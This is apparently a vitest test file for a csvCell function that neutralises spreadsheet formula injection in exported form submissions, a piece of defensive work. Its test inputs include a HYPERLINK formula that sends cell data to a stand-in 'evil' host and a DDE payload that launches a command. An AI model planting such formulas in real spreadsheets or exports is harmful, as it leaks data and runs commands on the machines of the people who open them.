import { describe, it, expect, vi } from "vitest";

vi.mock("../config/db.js", () => ({ query: vi.fn(), getClient: vi.fn(), default: {} }));

const { csvCell } = await import("../src/controllers/formController.js");

// Submission values are typed by anonymous visitors and opened by admins in a spreadsheet.
describe("csvCell", () => {
  it.each([
    ['=HYPERLINK("http://evil/?"&A1,"x")', `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`],
    ["+1+cmd|' /C calc'!A0", "'+1+cmd|' /C calc'!A0"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\t=1", "'\t=1"],
  ])("neutralises a formula: %s", (input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  it("leaves ordinary text and real numbers alone", () => {
    expect(csvCell("Jane Doe")).toBe("Jane Doe");
    expect(csvCell("jane@example.com")).toBe("jane@example.com");
    expect(csvCell(-5)).toBe("-5");
    expect(csvCell(null)).toBe("");
  });

  it("quotes commas, quotes and line breaks (including a bare CR)", () => {
    expect(csvCell("a,b")).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line1\rline2")).toBe('"line1\rline2"');
  });

  it("joins multi-select answers", () => {
    expect(csvCell(["red", "blue"])).toBe("red; blue");
  });
});
